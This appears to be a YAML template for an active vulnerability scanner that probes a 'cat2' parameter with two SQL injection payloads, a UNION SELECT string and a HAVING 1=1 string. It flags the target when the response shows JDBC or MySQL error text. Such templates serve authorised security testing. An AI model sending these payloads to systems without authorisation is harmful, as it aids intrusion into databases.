id: sqli6-generic-14
name: 'SQLi generic probe in cat2'
severity: high
type: active
tags:
  - sqli
  - injection
  - generic
description: 'Triggers generic error via cat2'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      cat2:
        - ''') UNION SELECT 1,2--'
        - ''' HAVING 1=1--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'JDBC'
          - 'Warning: mysql'
